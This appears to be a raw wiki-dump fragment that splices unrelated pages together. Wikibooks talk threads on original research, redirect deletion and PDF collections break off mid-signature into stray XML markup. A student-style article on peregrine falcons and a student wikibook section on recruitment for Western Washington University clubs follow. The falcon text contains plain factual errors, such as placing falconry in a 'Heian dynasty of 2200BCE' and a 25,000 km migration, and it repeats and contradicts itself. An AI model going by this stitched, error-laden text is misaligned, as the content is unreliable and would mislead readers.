: A bibliography would aid to make the book completely verifiable. The bibliography doesn't have to be anything fancy and there isn't any academic standard that you must follow in doing so. At the minimum just the names of some published books and/or some links to some reliable websites on the subject would suffice. I don't think anyone is saying that a book is a research paper, just that Wikibooks cannot host books based on information presented in a research paper that has not been previously published and peer reviewed. You asked if the book you were writing would fit here and mentioned that the book is based on your Artificial Consciousness research. You also mentioned in response to Panic2k4 that aspects of your work have not been published yet. What conclusion is someone suppose to draw from that? Sounds to me like the book is based on research that has not been published yet, so the book isn't going to be verifiable. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 08:25, 22 April 2009 (UTC)

What I am hearing, is that you have no tolerance for original work at all. I don't think that has always been the case, since you don't seem to have stopped some projects that were unique in the past, but because I have mentioned research, I am held to this artificial standard that others are not held to. Like I have said, the facts in my book will be generally verifiable, what is different is the interpretation that I put to those facts, and THAT is based on my Artificial Consciousness Research, because the facts take on a new flavor when seen through that lens. I chose this book because I didn't make any really startling changes to the basic understanding of how the brain works in it. The original flavor of it should not have been an issue, that you have chosen to make it an issue, I think says a lot about your predjudices as a group. Now I don't know what the past political history is between you and WikiVersity, although in some odd corners they seem to say that they were ejected from your group, but I am not trying to rely on my wikiversity membership or anything I just mentioned it in passing. Some of you have helped with the Wikiversity project, your signatures are known, so what exactly is the problem?--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 16:07, 22 April 2009 (UTC)

: The problem isn't Swift, me or anyone else here. The original flavor is an issue here because the Wikibooks community considers it enough of an issue to have a policy against it. This discussion would be different if this was happening on Wikiversity, I might even tell you to go for it, because original research, including original interpretations are fine there. However Wikibooks isn't Wikiversity. Even new interpretations of established facts based on new research needs to be peer reviewed first to be appropriate for Wikibooks. Each community is different, people who contribute to more than one project need to understand the norms and expectations of each community. I hope you can see how this has nothing to do with us, but with the nature of the Wikibooks project and the Wikibooks community. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 17:34, 22 April 2009 (UTC)

Ok, I gotta say that I am disappointed in the community here. It doesn't mean that I am not going to come up with another project eventually, or edit out the obvious mistakes in other books, but I think you are making arbitrary distinctions between different forms of originality and I resent that.--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 18:39, 22 April 2009 (UTC)

:The distinctions aren't arbitrary.  Primary research isn't what wikibooks is ''for''.  That doesn't mean we have closed minds, or that we don't appreciate how frustrating it can be when you have something that's awkward to fit into the available categories; but just because we sympathize and have open minds doesn't make wikibooks the right place for everything.  Some of us do primary research, too, but we don't do it here.

== Removing old naming convention redirects ==

There are currently a number of redirects in the [[Fedora And Red Hat System Administration]] book up for speedy deletion. The pages are redirects from the old colon naming convention and were moved in 2006. While I see no need to delete these, I did delete a bunch of such links from a book I was working on, but rationalised that with the major restructuring that we were undertaking. That and the fact that these pages were moved over a long time ago &amp;mdash; which is also the case here.

The problem is that links should generally not be broken so I think a good argument should be made for why a book would benefit from the removal of such redirects. Rather than just do what I feel is best, I wanted to get some more community input.

There are serveral ways we could go, including:
* keep all;
* delete all;
* soft redirects to encourage users to update their bookmarks/links;
* soft redirects which will eventually be deleted (give them a year or so?); and
* require discussion at [[WB:VFD]], or a demonstrated discussion and consensus amongst book contributors.

Any thoughts? --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 18:21, 18 April 2009 (UTC)

:I've no problem with delete all, even ignoring talk and user space broken links, if not recent (2 moths old links shouldn't be an issue).
:Soft redirects in my opinion are a waste of time and effort even if they are indeed more informative they also require manual maintenance.
:I don't see keeping old redirects in general as a good outcome, even the ones you like to keep to particular subjects so they can point out particular relevant books (but I also don't put the deletion of redirects as a top priority unless directly requested), the most problematic issues of keeping redirects is that it prevents &quot;movement&quot; of pages and further complicates the edit history logs (like if one needs to talk with the page creator)...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 19:52, 18 April 2009 (UTC)
:[[Help:Editing#Redirecting|Help:Redirect]], [[Help:Editing#Redirecting|Help:Redirects]] and at least [[Help:Editing#Redirecting|Help:Redirect/Page 2]] seems to need a cleanup...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 19:55, 18 April 2009 (UTC)

:If old, then delete them all. Sure it's not a huge deal, but I think it makes a &quot;mess&quot; that isn't particularly helpful. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual? Quite''']]&lt;/font&gt; &lt;sup&gt;&lt;font color=&quot;#306754&quot;&gt;[[User talk:QuiteUnusual|TalkQu]]&lt;/font&gt;&lt;/sup&gt; 20:12, 18 April 2009 (UTC)

A few thoughts...
* Redirects from the old naming convention are specifically recognized by the speedy-deletion policy under [[WB:DP#Speedy_deletions|SD9]]; that addition to the policy was discussed [[Wikibooks_talk:Deletion_policy/Archive 3#Add_old_redirect_pages_to_speedy_deletion|'''here''']].  I found that interesting reading (though I imagine it would look pretty familiar to Swift).  Other kinds of redirects are to be judged, within the existing policy, by SD10.  I've looked for other discussions on redirects, but only found scatter &amp;mdash; [[User:Aya]] opining back in 2005 that &quot;Redirects are generally a 'bad thing (tm)' on Wikibooks&quot;, and some non-guideline advice with a rather different tone at [[Help:Editing#Redirecting|Help:Redirect/Page 2]].
* My preference has been, historically, to tag redirects for speedy-delete fairly promptly after moves &amp;mdash; about as soon as I'm sure the page won't get moved back again &amp;mdash; so as not to forget to clean them up, on the theory that redirects clutter the namespace of the book, making it harder to keep track of the actual content (especially, harder to check for pages that aren't linked from the TOC).
* Concerning manual maintenance of soft redirects:  I much prefer soft redirects for those situations where I (at least for the moment) don't want to delete a page altogether.  On a not-unrelated note, isn't there a template for automatically activating code on a fixed future date &amp;mdash; and could it be used to preschedule a page to be speedy deleted later?  [[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 20:57, 18 April 2009 (UTC)

: Thanks for the archive link! I'd forgotten about this. It might make sense to clarify the issues in the deletion policy. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 17:31, 28 April 2009 (UTC)
== Collections (see before you get it into print) ==

I'm a bit confused. I thought I understood how collections are supposed to be set up, but when I try to get a PDF off of my Special Collections Page, it ignores all the modules, and when I try to get a pdf of each page, it insists on putting a heavy title bar with my page name on it, at the top of every pdf. How do you see what you are printing before you buy the book?--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 00:40, 21 April 2009 (UTC)

Obviously there is some meta-data that does not get displayed in the Collections pages that needs to be there for content to be printed as a pdf. Further the PDF converter seems somewhat limited in what it can do. However I managed to get rid of the clunky page titles eventually, and get the modules to print in order so I could see how they converted. I think that either this interface is too clunky, or the documentation is glossing over the critical detail that you need to add each page using the Add Wiki Page button, you can't just write it into the collection using edit. An interesting effect is how chapter headings just disappear once you add a module, and how some disappear even if you haven't added a module, seemingly at the whim of the converter. For instance I keep trying to put in a chapter header on CC-By-SA 3.0 and it keeps disappearing in my PDF file. I'm also not sure how you add pdf content, and the way it converts long Titles is quite annoying.--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E.

      <comment>/* Adaptations */</comment>
      <text xml:space="preserve">The peregrine falcon is the fastest animal in the world. It can attain speeds above 200 miles per hour as it dives toward its prey. Being a member of the genus Falco, the peregrine falcon exhibits many of the generic characteristics of falcons. It has long slender wings, a short tail, curved beak and sharp talons. The peregrine falcon is the fastest bird of prey in the world.
It can reach the 322 kilometers per hour. The peregrine falcon can reproduce since it is 1 year old. The peregrine falcon can lay three or four eggs and in extreme situations one or five. The eggs are incubated for 29 or 33 days.

Peregrine falcons are found perched high in trees and cliff sides in open areas like grasslands, tundra and meadows. They have also become accustomed to living in cities atop tall building. [2] Peregrines are one of the most wide spread species of birds in the world. Peregrine falcons are found on every continent except Antarcica.

Peregrine falcons primarily prey on small birds and occasionally small mammals, lizards and insects. When preying on birds, the peregrine falcon attacks and kills its prey in mid flight, then brings it to a perch to feed. Smaller prey items, such as bats and insects can be eaten in mid flight.  The peregrine falcon is one of the most successful birds of prey in the word.

==Adaptations==
The  falcon shares many characteristics with other falcons. Like all falcons they have long tapered wings and a short tail. These physiological adaptations equate to high speed maneuverability while in flight. These characteristics increase the fitness of areal predators. 

The name falcon is derived from the Latin word falcon meaning hook shaped and refers to the animal’s beak and claws. Falcons typically hunt small birds and they use their beaks and claws to swiftly immobilize and kill their prey while in flight. 

These combined traits make the peregrine falcon a very successful predator. It is the fastest animal in the world; clocked at over 200 miles per hour during a stoop, or dive while in pursuit of a prey item. At that speed, any small bird that the peregrine falcon places in its sights is not getting away. All falcons use their talons to latch onto prey while their sharp curved beak severs the prey’s spinal column at the base of the skull. 

The peregrine falcon’s coloration helps it to blend into its environment. There are 19 subspecies of the peregrine falcon and each has different colorations to aid with concealment in its native environment. The majority of the subspecies of peregrine falcon have speckled underbellies and black to slate or bluish black wings and head.

The peregrine falcon has developed several behavioral adaptations that increase its survivability in the wild. Peregrine falcons perch very high in tall trees, cliff sides and buildings which tend to reduce the predation of juvenile young by small mammals and lizards. Beyond reducing predation, a tall perch increases the successfulness of the peregrine’s ability to successfully live hunt. Generally speaking, the higher the peregrine falcon is in reference to it prey, the faster speeds it can attain during its pursuit the higher the probability of a successful capture.
	
For the most part, peregrine falcons do not build nests. Occasionally they will use nests that have already been built, but they tend to dig simple depressions out of the soil on cliff sides. This cuts down on energy expenditures and maintains an adequate energy reserve for hunting. 

The peregrine falcon has also developed a proclivity towards city life. The tall buildings provide excellent opportunities to perch and the abundance of overweight pigeons provide a huge amount of biomass to feed off of. It makes the peregrines’ life a lot easier and it cuts down on city pests.
 
Falcons share a close evolutionary history with both hawks and eagles. All three species of birds have developed excellent visual acuity and powerful talons and beaks for catching and immobilizing prey. The evolutionary aspects that separate eagles, hawks and falcons are primarily Loven behaviors and the morphology of fight appendages.  

Hawks tend to attack small land mammals by grasping and killing them with its talons. Hawks kill by inflicting massive amounts of physical damage to their prey. As stated previously, falcons hunt and kill small birds by grasping them with their talons and severing their spinal column with their sharp hooked beak. [1] Eagles, such as the bald and golden eagle, soar high above their prey, using their superior vision to pick out small mammals and fish, then swoops down and grasps its prey and carries it off to a feeding perch.

Hawks, falcons and eagles deviate from each other it terms of the morphology of their respective flight appendages.  Falcons have long tapered wings and short tails which lend to its amazing areal speed and agility.  Eagles have very broad wings that are designed for soaring and short tails that aid in maneuverability. Eagles are the intermediate form between falcons and hawks. Hawks have broad wings and long tails which provide a very stable platform for flight.

==Habitat==
Peregrine falcons can be found in open habitats such as grasslands, tundra and meadows. They can also be found in deserts and at elevation from sea level to 12,000 feet.  They prefer open areas because these areas complement the peregrine falcons’ hunting behaviors. They are most common in tundra and coastal areas.  In recent years they have been found in urban areas and cities due to the fact that tall buildings provide the perfect perch for hunting and nesting.
	
Peregrine falcons are found all over the world. They inhabit every continent except for Antarctica. They are one of the most prevalent terrestrial vertebrates in the world.  Though some of the populations of peregrine falcons such as southern Pacific and Island dwelling birds do not migrate, the peregrine falcon is one of the furthest migrating birds in North America. The peregrine falcon migrates very long distances during the year. Its name is derived from the Latin word peregrinus, meaning wanderer.  Some falcons that live in the tundra of Alaska and Canada can be found 25,000km south in Argentina during the winter months. 

==Role in the Ecosystem==
	
The peregrine falcon is an apex predator that is almost at the top of its food web. It preys on a variety of organisms that dwell within its home range. As a predator, its role in the ecosystem is a check and balance for population control. Birds of prey pick off the weak and sickly of a population of prey items which in turn tends to increases the fitness of successive generations of that population. The peregrine falcon eats birds that include mourning doves, pigeons, shorebirds, waterfowl, ptarmigan, grouse, and songbirds. Along with birds, it preys upon small reptiles and mammals including rodents and bats.

There are very few organisms that prey on the peregrine falcon. For the most part, other, larger, birds of prey such as great horned owls, gyrfalcons and golden eagles are the only predators of adult peregrines while juveniles may be taken by mammalian predators such as cats, bears, wolverines, and foxes.  Another threat to adult peregrines is rival peregrine falcons. Competition for territory, resources and mates can lead to adult mortality.

==Interaction with Humans==
	
The interactions between the peregrine falcon and man are primarily positive interactions for both parties. The peregrine falcon serves as a pest controller on farms and airports.  Falcon handlers train and use falcons to keep problematic bird species at airports under control.  When released, the peregrine falcon peruses and kills birds that could get caught in and damage aircraft engines.  Over time, the problematic bird species will stay out of the falcon’s established territory. In recent years, the falcon is being replaced by specially designed sirens. On farms, peregrine falcons keep small rodent and bird populations in check. [1] This in turn maintains crop and livestock viability and reduces losses for the farm.
	
The art of falconry, using birds of prey such as hawks and falcons to hunt wild game, dates back to the Heian dynasty of 2200BCE. The relationship between falcon and man has been going strong for well over 4000 years.  Falconers would take fertilized eggs from a roost and raise and train the chicks from birth to hunt and capture small birds and squirrels. 

Today falconry is a dying art. With grasslands acquiescing to urbanization, areas to practice falconry are simply disappearing. A once popular mode of making a living has been reduced to a pastime reserved for renaissance festivals and airports.  

The one interaction between the peregrine falcon and man that is detrimental to the latter is the predation of farm animals such as chickens and waterfowl. [1] These selectively bread, relatively immobile animals are easy targets for such a dynamic and specialized predator. Given the fact that this is the only real detrimental aspect of the relationship between man and the peregrine falcon, man is much better off with it than without it.

      <text xml:space="preserve">This section includes solutions to problems of recruitment and retention.

Recruitment refers to the process of screening, and selecting qualified people for a job at an organization or firm, or for a vacancy in a volunteer-based. Some components of the recruitment process, mid- and large-size organizations and companies often retain professional recruiters or outsource some of the process to recruitment agencies. Other ways that recruitment takes action is by getting the word out there for a certain organization to attract attention to the field of interest. 

For example, a lot of clubs have a difficult time recruiting members, but many clubs have come up with strategical and effective means of recruitment. How clubs recruit members often depends on the nature of the club. A lot of Western’s clubs rely on word of mouth, and can often be found advertising their club at information fairs or in Red Square.

==Recruitment==

Recruitment refers to the process of screening, and selecting qualified people for a job at an organization or firm, or for a vacancy in a volunteer-based some components of the recruitment process, mid- and large-size organizations and companies often retain professional recruiters or outsource some of the process to recruitment agencies. Other ways that recruitment takes action is by getting the word out there for a certain organization to attract attention to the field of interest.

For example, a lot of clubs have a difficult time recruiting members, but many clubs have come up with strategical and effective means of recruitment. How clubs recruit members often depends on the nature of the club. A lot of Western’s clubs rely on word of mouth, and can often be found advertising their club at information fairs or in Red Square. In this section you will find many recruitment methods that have been successful for current Western clubs.

One of the key features for successful recruitment includes accessibility for the all too busy lives of many college students. The WWU Strongman Club is based at the Wade King Student Recreational Center (SRC) and is open to all Western students. The club administrators either work or spend a significant amount of time at the SRC which allows constant access by the members of this club. Unlike most other clubs where the club meetings and events are really the only time club members interact with the administrators and other members of the club, the WWU Strongman Club provides day to day opportunities for all members to talk with and benefit from the insight of the leadership. Since the main goal of the club is to inform the members on how to train, lift weights, and diet properly the success of this stems from being able to access the administrators who are well informed and experienced in sport science. The club has a Facebook page with 60 members and it provides a great way to keep in touch. It holds plenty of discussion topics and even more links to useful websites. Such websites have great information on healthy eating, the best and cheapest supplements and effective stretching. I would consider Facebook one of the club's
main most effective recruiting method.

Another great way to feel part of the club is that the majority of the members train at the rec on a daily basis. Everyone is very willing to help each other out. I have asked multiple times for advice on a certain workout routine or for a spotter
The SRC is open every day and is located on campus which allows ease of access by all on and off campus students. Becoming a member is as easy as putting your name on a list and sustaining membership means working out and dieting properly. This similar success has been noted by Allie Paul, Art Gallery Assistant Coordinator, who says that her job is a little easier to accommodate because the Art Gallery at Western is open every day and has a wide range of hours that let students wander in and out on their own time.  

Another example of a club which has been successful in recruitment in a creative way is the Dead Parrot Society; The Dead Parrot Society has an interesting recruiting process for their club.  You cannot automatically become a member, instead the members must specifically ask you to join their club.  It is a try-out based recruiting process in which anyone can drop-in and participate every Tuesday night. On Tuesdays they, both the parrots and the drop-ins (however not all drop-ins want to be members, some go because it's funny and a good way to let off steam, but most of the drop-ins go because they eventually want to become members, but it does take a while). They play different acting games for two hours, improving their skills while having some laughs along the way. To advertise Tuesday drop-ins, participants tell their friends, use social networking on Facebook, and members announce open drop-in sessions after they present a show.  In the croquette club they also use social networking and word of mouth as forms a recruitment.  With more recruited members the club will grow and become much more popular.  Doug, a three-year member of Dead Parrots, stated that he enjoys having a small group of Dead Parrots but the group is lacking popularity. Popularity is important to a successful organization and therefore recruiting is crucial to success.

Like the Dead Parrot Society the Rugby club is open to all new members and welcomes all. The difference between the two is that the Dead Parrot Society needs to keep its talent at its highest level when putting on shows to keep the fan count high. The Rugby club is more interested in allowing all members to participate in all aspects of the club. According to Jason and Rowan, members themselves, the club is &quot;open to anyone who is interest about the sport.&quot; The goals of the club are to promote the sport, practice techniques, spread enthusiasm the sport, and most importantly to socialize. It is therefore not important whether a person looking to join is a seasoned veteran or new to the sport. In addition, members of the club are encouraged to talk about the club with their friends to continue to increase the publicity of the club. 

One aspect of the Ritmo Salsa Club that is a big strength is the amount of members for a club of its type. At the meeting that I attended, there were about 25 advanced dancers getting a lesson from two instructors as well as three or four beginning members being taught by two instructors. According to Rachel Mortan’s interview for the tango club, they have about twelve members that attend meetings each week. That is way less than the Salsa Club which shows that the Salsa Club is superior in getting a large amount of members, especially towards the end of the year. Like many other AS clubs on campus, Ritmo Salsa Club recruits new members by word of mouth. Getting people excited about dancing is important when trying to get people to actually join the club so hearing about friends that are excited about it gets others involved. A strength of the Ritmo Salsa club is their ability to get word out about the club and get people interested. The person I interviewed at a meeting of the club said that they had heard about the club simply by word of mouth and hearing about her friends attending. Also, especially for clubs that involve activities such as dancing, a good way to get people excited about it enough to actually come to a meeting is to demonstrate. Performances give students a chance to see how much fun salsa actually can be which inspires them to go out and join the club. 

The WWU Body Building Club is able to recruit all sorts of people, because a lot of students are into going to the Wade King Rec. Center and the club is open to anyone and everyone. You don't have to have a specific physique or even want to compete in competitions to be part of the Body Building Club. A lot of students go to the rec center whether it's to socialize or to work out, but the point is that the Body Building Club is located in a central popular location. A club similar to this (strength of easily recruiting members) is the Croquet Club. The Croquet Club, according to Zachery Stratton: &quot;A major strength that the club has is recruitment; they are never short of people when they host events, such as tournaments and championships.&quot; In a town like Bellingham, sports and fitness are everywhere, clubs supporting any type of fitness do not have an issue with members. The Rugby Club is somewhat similar, as according to Marisa Mikelson's transcript they don't have a problem getting members, but they have a problem keeping them. The Body Building Clubs organization really contributes to the recruitment, the main leader (Stephanie Singer) is very personable, making it easy and no hassle to join!

The Scottish Country Dance Club at Western Washington University has trouble with recruitment due to the fact that the leaders of the group are very old. Their age gives them a disconnection to students which in turn contributes to the lack of members compared to many other groups on campus. At the same time, there is members of the group now because they were brought in by Tom or Rosemary. The fact that this elderly couple has such intense energy for the group is inspiring to some students. Another factor that leads to problems with recruitment is that the main student member that does the recruiting is a woman. If the one male in the group were to go out and try to get more men to join there would be a better chance of increasing the male members. If there were multiple girls to go out and just target men to join they would have better luck than one girl describing and talking about the group by herself. I think the number of members will increase because this group is so welcoming and more than willing to work with a new group member.  

(A) A great place for a club like Students for Slum doctor Program to advertise their club would be around the fairhaven branch of Westerns campus, in south campus. There seems to be a good amount of knowledge in the students and faculty there regarding social issues, so recruitment for the club Students for Slum Doctors, or any other Social club could be very effective around Fairhaven. I have seem many clubs working outside red square for recruitment and fundraising activities, including the men against violence club, but many people are too busy when on campus to stop and loook into clubs that interest them. I feel like getting deeper into the schools themselves, like Fairhaven or the anthropology department (especially for social issues clubs), would be a better place to advertise clubs and activities. Another good way to advertise events may be to ask a teacher in one of these classes to let you give a brief introduction to ones club and goals at the beginning or end of a class period, and possibly teachers could give extra credit to those people who choose to help/join. In all, It seems that recruitment must find its way deeper into the classroom in order to become more effective.

One aspect of Croquet Club, founded by Devin Spencer, that is never lacking is recruitment. Many different types of people come each month to have fun and compete in the age old sport of Croquet. The club is open to anyone and everyone, whether you are a student, alumni, or just someone who enjoys Croquet. Recruitment is simple and effective. Devin has made his own Croquet Club Facebook page especially for recruitment. It has descriptions of when each meeting/ tournament will be as well as a description of the previous week for those who could not make it. The page itself boasts over 100 members, with at least 20 or so members showing up for each event. The club is a very popular one, to say the least. They also recruit by rampant word of mouth, taking in all of those who wish to play an original, fun, exciting game complete with snacks, a leader board, and trophies up for grabs. Large groups of friends tend to come together to play and new, lasting friends have been made through Croquet Club. The pure fun factor of this club is all that’s needed to encourage different types of people, friends, acquaintances, or alumni to come back each month. Devin says that “we are starting the new wave of Croquet players. This is not a granny sport.” This quote illustrates that contrary to popular belief, Croquet is a blast and young people, especially college students, are enormously attracted to its fun, laid back, competitive qualities. Another club that has little problems with recruitment is The Photography Club. Similar to Croquet Club, you do not have to be of a certain skill level to show up and have a great time, so people of all backgrounds will show up for Photography Club in large, willing numbers. The WWU Body Building Club is also open to many different people of different physiques and skill levels, which attracts a large amount of people interested in getting in better shape. Recruitment is based on different things throughout different clubs. The enjoyment that Croquet Club offers is more than enough to recruit many people effectively and without too much effort.

The Scottish Country Dance Club has been an established club at Western for the past 15 years, so they have been able to promote their club affectively and recruit new members consistently. Most of the members are recruited by general word of mouth, by friends of friends etc. Several of the members, however, were recruited by either Tom or Rosemary Read, who have been involved in the club since the beginning. Tom is a math professor and Rosemary teaches a dance class at Western so they encourage all of their students to get involved in the club. The club’s generally welcoming attitude and fun feeling attracts first timers to continue coming to club each week. The Scottish Country Dance Club is not intimidating because the current members are easy going and love teaching new dancers the steps of country dancing. So, everyone feels welcome and wanted.

The WWU Scottish Country Dance club founded around 1994 has seen a number of members come and go. The club currently has 9 members who come on a regular basis, but is always open to new members.  Generally recruitment is done by word of mouth, or through the help of the founders Tom and Rosemary who are both teachers on campus. What’s great about the Scottish Country Dance club is you can be of any skill level. Their club ranges from very experienced dancers to some inexperienced ones, all are welcomed. In most clubs or sports this may not be the case. Usually, the more advanced or skilled players are the ones chosen to join and the less experienced are usually excluded. Instead the Scottish Country Dance club welcomes with open arms and is wiling to take the time to make sure each member not only develops as a dancer but also has a lot of fun.

Recruitment for Western Washington University's Scottish Country Dancing Club has been somewhat of a challenge. The club doesn't have a lot of regular members that attend the class every week. There is around nine regular members to show you how little of a group it is. There is roughly give-or-take 15 people that are present for the club weekly. There are several different ways of recruiting for the club. One method is simply by word-of-mouth. The regular attendee goes around in between classes and in their classes as well. They also try and wear shirts that support Scottish Country Dance to hopefully get other people to ask questions and be interested in the club. Another way of recruitment is simply just having posters to advertise the time the club meets and it gives the contact information for those who are interesting in getting more information about the club if the poster or flyer did not meet their needs. Recruitment has been a little bit of a struggle, but is still hopeful and expects to get more people interested in Scottish Country Dance Club.

KUGS the local radio station on campus at Western Washington has been established for almost 35 years. They have a successful system down of recruiting paid employees along with volunteers. KUGS starts reviewing applications for volunteers for the upcoming quarter during dead week. Each volunteer will receive their own two hour spot of reading the news live on the air. After news reading for a quarter a volunteer can move up in the radio station to having their own speciality show where they get to choose the music they want to play on the radio. Along with volunteers the radio station is ran by eight paid employees who are responsible for making sure all the behind the scene work is taken care of. KUGS begins its hiring for its paid employees during spring quarter along with the Associated Students. The method of applying to become part of KUGS is traditionally different from other clubs on campus like the sailing club where students are recruited primarily by word of mouth and from the sailing class. However I feel that KUGS method of applying creates more motivation and dedication from interested students because it allows for flakey students to be eliminated at the very beginning of the application process. KUGS has a place for anyone interested in learning more about how a radio station is ran and what goes on behind the scene.

The VOX: Planned Parenthood club at Western Washington University has very little difficulty attracting students with a membership of over 40 people, but they have struggled to attract members of both sexes. The vast majority of VOX's members are female. They believe this is because men feel that Planned Parenthood is a &quot;female organization&quot; and that VOX is a &quot;female club.&quot; Western's Tango club struggles with a similar problem, having a female to male ratio of 3 to 1. VOX members regularly set up booths in red square and hand out information and free condoms in an attempt to attract students of both genders to come talk to them, but they have continually found that girls are much more likely to join the club. Booths in Red Square are the clubs main form of recruitment, but they also recruit by word of mouth of current members. The club continues to thrive with its female majority, but would greatly benefit from a more even ratio. While not all clubs will struggle with this problem it is generally beneficial to have roughly equivalent representation from both genders, especially in matters concerning sexual health. 

From what I've learned by being involved in Students Against Optional Clothing, organization and event planning seems to be a definite problem. An organization strategy that I believe would be effective for this group would be informing more people of this specific group. Before becoming apart of this group I had never heard of this club before. I think if the club wants to recruit more members they need to make themselves more available to the public. By posting flyers around campus, creating a Facebook account, and possibly word of mouth they will be able to recruit more members. Since the club lack members planning events and meeting are difficult. The more people that are aware of this club the more people they will be able to recruit. Which will make organizing events easier and more efficient. Looking through other groups the Harry Potter Club and the Ritmo Salsa club also seems to have a problem with recruitment and organization. As I mentioned before, these clubs need something to make the people more aware of these clubs. Posting flyers, handing out pamphlets, and word of mouth would be a good first step in informing people and gaining members. 

WWU's A'Capella Club is a recently formed club as of 2008. Because of its recent creation, the group and it's leader are still in the molding process in making it a solid group so recruitment of new members is open to all, similar to what you would see with Campus Christian Fellowship. If you have talented singing voice and are willing to show what you've got to the public than you are more than welcome. Generally recruitment will be done through word of mouth in order to gain popularity amongst students, but later on they are hoping to set up some signs and posters amongst the campus. One of their goals is to have a culmination on some of the most talented voices at WWU to create an award winning a'capella group. The group does offer a more exclusive male singing group run by the leader that does require a try out. Through this members can gain a better loyalty to the group which would help them carry on the groups traditions, rules, overall organization.

From the many different posts above it shows that the clubs on our campus use many different techniques for recruitment. Some of the most common threads between these clubs is word of mouth and social networking. Most of the above clubs have a Facebook group to try and interest new students into joining the club. But without word of mouth from current members of these clubs, recruiting would be a very difficult task, and this seems to be the most effective method for recruiting new members. 

The amount of players that need to be recruited can be a careful balance. For certain sports, such as the Croquet Club, the numbers need to be kept low in order to have enough materials since croquet materials are not easily come by. On the other hand, there must be enough participants to keep the fun up. Also if more students participated, there would be a greater opportunity to fundraise and a stronger drive to find the money. Although clubs such as World Injustice Awareness Club and Western Men Against Violence clubs feel that they have a problem with recruitment to their clubs, sports clubs such as Croquet have effective organization when they realize what an appropriate number for their activity is.

===Invite Based Recruitment===
The underlying goal behind every Associated Students Club is to bring students together around a common cause or concept.  Every club does their very best to appear welcoming and appealing, but gaining new members is a constant challenge.  Invitation based recruitment is likely the most effective method of recruiting new members given that it establishes a sense that a person's presence truly is desired at the meeting, it affirms that the club is legitimate, and it instills a personal tie into the group so that the new person could truly feel welcomed and important.

The A'Capella Club at WWU is new as of the 2008-2009 school year, yet they have employed some recruitment techniques that prove very useful. Although the group is open to all students, there is an exclusive performance subgroup of male singers which is put together by the group's leader. As this is the first year the group has been together, it has been possible for the recruitment and shaping of the ideal group to be done by the original members and leader. However, in future years, there will be no original members. By  word of mouth and the use of invitations, personal recruitment can ensure that future members will meet the standards of the original group. Also, by handing down leadership positions to a trustworthy and loyal member, the group can maintain the same organization and codes of conduct. Similar to the A'capella Club, the Rugby Club personally invites members, continuing and ensuring a club full of members that would be approved by the original members.

Campus Christian Fellowship (CCF) is an evangelical Christian group the meets on campus at WWU on Friday nights. The group was created in the spring of 1972 and is still growing with over 300 members. Although CCF has over 300 members from Western Washington University, Skagit Community College and Whatcom Community College, they are always open and wanting more. CCF is a group that recruits members solely by word of mouth, events and invites by current members. CCF is not a closed group and is open to anyone and everyone. There is no process to becoming a member; simply show up. One quality of CCF that is appealing to visitors is the passion that the group contains. There is a passion among the members of CCF for what they believe that is almost overwhelming as a visitor, but yet a sight that can't be experienced elsewhere. In an interview with Brady Bobbink, who is the head pastor for CCF, he said, “Over years the essential structure that any student who comes in is cared for, helped along.” When a new student comes to CCF they are welcomed with open arms and every Friday night there is a form of a treat to welcome the new student or member. Much like CCF, the Tango and Salsa clubs have such a passion for their club and are open to anyone who would like to join. These three clubs at WWU are open groups that gain awareness by their own members and by word of mouth.

The Photography club is a fairly new campus club that takes pride in the art of photography. The club was recently started by Carmen Daneshmandi and meets at 6pm on Mondays. The club is open to all people interested in photography. There is no requirement besides having a camera so you can take part in photographing images you wish to share with the club. There is no camera that will not work for the club, for example some great pictures have been taken from camera phones. Again all people are welcome and the only requirement is that you find your own camera.

===Word of Mouth===
Word of Mouth is the most effective way of recruiting members in community of another's interest. Often including passing on information through group members by dialogue to other about unique skills or interest of the club/group in question. Usually attracting new recruits who already know at least one member and can acclimatize/ be more comfortable in starting activities free from nervousness. In making peers and community members relate to members it is possible to perhaps all move forward in a united effort to accomplish goals. Examples of ways to use informative word of mouth used at Western Washington University clubs include:  

The Students Against Civilization don't go out of their way to recruit members; the club grows in the same way as the CCF, tango, and salsa clubs, via the mechanism of word of mouth. They have the advantage of a club that is so immensely intriguing and important that kids come simply to hear what there is to be said on the topic. After seeing that there is no fee or other requirements for membership, they tell all their friends how great the club is and in this way the club grows all the time. The club elders warmly welcome newcomers and the whole atmosphere is very open and inviting. The intellect on display draws students back time and time again as their contemplation over night of the prior discussion gets the inner cogs turning and the student finds themselves unable to resist the savory debate.

Just as The Students Against Civilization, the Creators of Visual Art and Literature Society also do not make it a priority to recruit their members. Aside from an information fair towards to beginning of the year, they receive most of their members by word of mouth. As most groups do, the members of this club all share common interests and attend to create. Because most of these members share common interests they often fall into the same social groups. Several of the members are in other clubs together or joined because they were already acquainted with members of the club. Different from The Students Against Civilization club in that they are content with a slow in flux of members but similar to the A’Capella club in that “If they wanted, they could become much more well known”, the members of Visual Art and Literature Society seem to be very content with their quiet status, they are happy to meet once or twice a week and create just for the fun of it.

